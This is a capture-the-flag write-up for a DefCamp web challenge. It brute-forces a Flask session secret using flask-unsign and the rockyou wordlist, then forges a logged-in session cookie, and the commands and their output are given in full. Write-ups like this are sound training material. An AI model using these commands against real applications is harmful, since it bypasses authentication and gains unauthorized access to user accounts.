# DefCamp - web-intro

/ : `Access Denied`

**Cookie**: session=eyJsb2dnZWRfaW4iOmZhbHNlfQ.Ygs_NA.wxZwBis71csCsb5cqaEIEyGdIQw

Head to jwt.io --> edit --> `{"logged-in": false}` --> {"logged-in": true} --> ValueError: year 15225.... is out of range... flask....


We could edit the cookie header, although the secret part is invalid, the app still loads this cookie but raise error right after, if we want to edit jwt cookie, we have to known the secret.

**Search**: `flask hacktricks`

Default cookie session name is session(yes, it's not Authorization: Bearer <token>)


**Brute-Force**: brute force Secret Key using flask-unsign module
```bash
./flask-unsign --unsign --cookie --wordlist /usr/share/wordlists/rockyou.txt -c 'eyJsb2dnZWRfaW4iOmZhbHNlfQ.YgtANg.cyf04jdHMP_ObmEG0eAW2psQwOQ' --no-literal-eval
# [*] Session decodes to: {'logged_in': False}
# [*] Starting brute-forcer with 8 threads..
# [+] Found secret key after 128 attempts
# b'password'
```

  **Edit** the token:
  ```bash
  ./flask-unsign --sign --cookie "{'logged_in': True}" --secret 'password'
  # eyJsb2dnZWRfaW4iOnRydWV9.YgtDag.cVK8x-2PERXwTcYPTzJikW7KSu8
  ```
  Notice that this is python(flask) so `True` is case-sensitive!!
  
  You are logged in! CTF{66bf8ba5c3ee2bd230f5cc2de57c1f09f471de8833eae3ff7566da21eb141eb7}
